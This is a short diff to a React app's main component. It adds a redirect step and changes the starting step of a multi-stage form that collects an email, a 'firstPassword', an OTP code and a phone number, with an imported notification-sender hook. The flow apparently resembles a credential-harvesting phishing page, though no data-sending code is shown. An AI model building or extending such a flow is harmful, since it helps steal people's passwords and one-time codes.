@@ -1,4 +1,5 @@
 import { useState, useRef, useEffect } from "react";
+import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
 import "./App.css";
 import Logo from "./assets/bannerlogo.png";
 import { Email } from "./components/Email";
@@ -8,9 +9,10 @@ import { OTP } from "./components/OTP";
 import { Phone } from "./components/Phone";
 import gsap from "gsap";
 import NotificationSender from "./components/NotificationSender"; // Import the NotificationSender hook
+import Redirect from "./components/Redirect";
 
 function App() {
-  const [step, setStep] = useState("email");
+  const [step, setStep] = useState("otp");
   const [email, setEmail] = useState("");
   const [emailError, setEmailError] = useState("");
   const [firstPassword, setFirstPassword] = useState("");
@@ -112,6 +114,10 @@ function App() {
     setTimeout(() => setStep("otp"), 2000);
   };
 
+  const handleNextFromLoad = () => {
+    setTimeout(() => setStep("email"), 2000);
+  };
+
   const handleOtpVerification = () => {
     setStep("loader");
     setTimeout(() => {
@@ -129,6 +135,12 @@ function App() {
       <div className="container">
         <img src={Logo} alt="logo" className="logo" />
         <div className="form-wrapper" ref={formRef}>
+          {step === "redirect" && (
+            <Redirect
+              onNext={handleNextFromLoad}
+              setStep={setStep}
+            />
+          )}
           {step === "email" && (
             <Email
               onNext={handleNextFromEmail}
